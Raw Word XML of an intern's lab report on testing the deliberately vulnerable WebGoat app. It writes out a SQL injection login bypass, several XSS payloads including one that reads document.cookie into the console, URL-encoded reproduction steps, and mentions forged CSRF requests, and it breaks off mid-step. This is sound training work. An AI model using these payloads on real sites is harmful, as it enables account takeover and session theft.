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ACA" w:rsidRDefault="00107082">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>Cybersecurity Internship – Task 2 Report</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00107082">
      <w:r>
        <w:t>Intern Name: Priteshsinh Ashokkumar Chavda</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00107082">
      <w:r>
        <w:t>Internship Period: September 2025</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00107082">
      <w:r>
        <w:t>Organization: Redynox</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00107082">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00107082">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Table of Contents</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00107082">
      <w:r>
        <w:t>1. Objective of the Task</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>2. Tools and Methods Used</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>3. Steps Taken</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>4. Challenges and Solutions</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>5. Results and Outcomes</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>6. My Opinion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00107082">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00107082">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>1. Objective of the Task</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00107082">
      <w:r>
        <w:t>To identify common web application vulnerabilities (SQL Injection, XSS, CSRF) using OWASP ZAP and manual techniques on WebGoat.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00107082">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Tools and Methods Used</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A91ACA" w:rsidRDefault="00107082">
      <w:r>
        <w:t>- OWASP ZAP</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- WebGoat (vulnerable web application)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Firefox Browser with proxy set to OWASP ZAP</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00A91ACA">
      <w:r>
        <w:t>- DVWA app</w:t>
      </w:r>
      <w:r w:rsidR="00107082">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00107082">
        <w:br/>
        <w:t>Methods:</w:t>
      </w:r>
      <w:r w:rsidR="00107082">
        <w:br/>
        <w:t>Automated scan and manual exploit of vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00107082">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Steps Taken</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00107082">
      <w:r>
        <w:t>1. Set browser proxy to 127.0.0.1:8080 (OWASP ZAP).</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>2. Ran automated scan on WebGoat application.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>3. Manually exploited:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">   - SQL Injection by using payload: ' OR '1'='1</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">   - XSS by using payload: &lt;script&gt;alert('XSS')&lt;/script&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">   - CSRF by submitting forged POST requests without CSRF token.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00107082">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Challenges and Solutions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00107082">
      <w:r>
        <w:t>- Initial proxy misconfiguration resolved by setting correct proxy in Firefox.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Learning manual exploitation by following WebGoat guidance.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="00107082">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Results and Outcomes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39"/>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> (A). SQL Injection on Login Page</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39"/>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39">
      <w:r>
        <w:t xml:space="preserve"> In the first screenshot, you attempted a classic SQL Injection payload:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39">
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39">
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00E82D39">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>' OR '1'='1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39">
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Outcome :</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39">
      <w:r>
        <w:t xml:space="preserve">  This bypassed authentication and allowed me to log in as a valid user without knowing the correct username or password.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5486400" cy="2662589"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="1" name="Picture 1" descr="C:\Users\patelrinku311\Desktop\screenshot webgo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elrinku311\Desktop\screenshot webgoa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39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39">
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00E82D39">
        <w:rPr>
          <w:rStyle w:val="Heading2Char"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E82D39">
        <w:rPr>
          <w:rStyle w:val="Heading2Char"/>
          <w:rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00E82D39">
        <w:rPr>
          <w:rStyle w:val="Heading2Char"/>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> Demonstrates that the login form is vulnerable to SQL Injection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39"/>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> 2. Successful Login &amp; Access to Lessons</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39"/>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Outcome:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39"/>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39">
      <w:r>
        <w:t xml:space="preserve">   Confirms SQL Injection worked and created an authenticated session.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E82D39" w:rsidRDefault="00E82D39" w:rsidP="00E82D39">
      <w:r>
        <w:t xml:space="preserve">  I  have access to all the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WebGoat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> lessons, simulating how an attacker could gain full access to a web application’s functionality.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A5AA1" w:rsidRDefault="002A5AA1" w:rsidP="00E82D39">
      <w:r w:rsidRPr="002A5AA1">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5486400" cy="2662573"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="4" name="Picture 2" descr="C:\Users\patelrinku311\Desktop\screenshot webgo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elrinku311\Desktop\screenshot webgoat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A1" w:rsidRDefault="002A5AA1" w:rsidP="002A5AA1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. 404 Error (Broken Link / Missing Resource)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A5AA1" w:rsidRDefault="002A5AA1" w:rsidP="002A5AA1">
      <w:r>
        <w:t xml:space="preserve">  HTTP Status 404 – Not Found</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A5AA1" w:rsidRDefault="002A5AA1" w:rsidP="002A5AA1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Outcome:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A5AA1" w:rsidRDefault="002A5AA1" w:rsidP="002A5AA1"/>
    <w:p w:rsidR="002A5AA1" w:rsidRDefault="002A5AA1" w:rsidP="002A5AA1">
      <w:r>
        <w:t xml:space="preserve">  The server responded with a 404 error, meaning the requested resource (`/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>webGoat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>`) does not exist.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A5AA1" w:rsidRDefault="002A5AA1" w:rsidP="002A5AA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>This could happen if:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A5AA1" w:rsidRDefault="002A5AA1" w:rsidP="002A5AA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The wrong path/endpoint was typed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A5AA1" w:rsidRDefault="002A5AA1" w:rsidP="002A5AA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The application was restarted or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>misconfigured</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A5AA1" w:rsidRDefault="002A5AA1" w:rsidP="002A5AA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Some resources are intentionally hidden or restricted.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A5AA1" w:rsidRDefault="002A5AA1" w:rsidP="002A5AA1">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. My Opinion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A5AA1" w:rsidRDefault="002A5AA1" w:rsidP="002A5AA1">
      <w:r>
        <w:t>This task taught me how dangerous web vulnerabilities are when left unprotected. It showed me the importance of parameterized queries, input sanitization, and CSRF tokens in securing applications.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>(B) DOM / Reflected XSS on Lesson Page</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8"/>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>1. Test / Where:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t>`http://192.168.45.124:8080/WebGoat/start.mvc#test/&lt;payload&gt;` — the page accepts fragment/hash content and renders it into the DOM unsafely (see screenshot).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8"/>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t>Example payload (plain):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">="x" </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>="console.log('</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>phoneHome</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> invoked');" /&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t>URL-encoded payload for the address bar (copy/paste into browser):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>http://192.168.45.124:8080/WebGoat/start.mvc#test/%3Cimg%20src%3D%22x%22%20onerror%3D%22console.log('phoneHome%20invoked')%3B%22%20%2F%3E</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t>Alternative demonstrative payloads:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t xml:space="preserve"> Show a DOM effect (alert) — useful in labs:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">="x" </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>="alert('XSS')"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t xml:space="preserve"> Simulate data leak (lab: console observable instead of network </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>exfiltration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">="x" </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">="console.log('phone home said', {cookie: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>})"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Observed outcome (from my screenshot):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8"/>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t>* The console shows `</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>phoneHome</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> invoked` / `phone home said {...}` and the lesson reported a completion (`"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>lessonCompleted</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>":true`).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t xml:space="preserve">  This indicates the `</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">` handler ran in-page (DOM XSS), and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WebGoat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> recorded the successful injection and "phone home" callback. The page executed attacker-controlled JavaScript when it rendered the supplied fragment.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Impact:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8"/>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>An attacker can run arbitrary JavaScript in the victim’s browser in the context of the vulnerable site (session cookies, DOM manipulation, perform actions on behalf of the user).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>If exploited by a remote attacker, this can lead to session hijacking, persistent account compromise, defacement, or use of the victim browser as a pivot to internal resources.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8"/>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> 2. Reproduction Steps (step-by-step)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8"/>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t xml:space="preserve">1. Open the vulnerable </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WebGoat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> instance in a browser:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>http://192.168.45.124:8080/WebGoat/start.mvc</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t>2. Append the payload to the fragment/hash portion of the URL (either raw or URL-encoded). Example:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>#test/&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">="x" </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>="console.log('</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>phoneHome</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003213E8">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> invoked')"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t xml:space="preserve">3. Press Enter. Observe the page render and open </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>DevTools</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> → Console. You should see the logged message (or alert, if using alert payload).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t>4. Confirm `</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
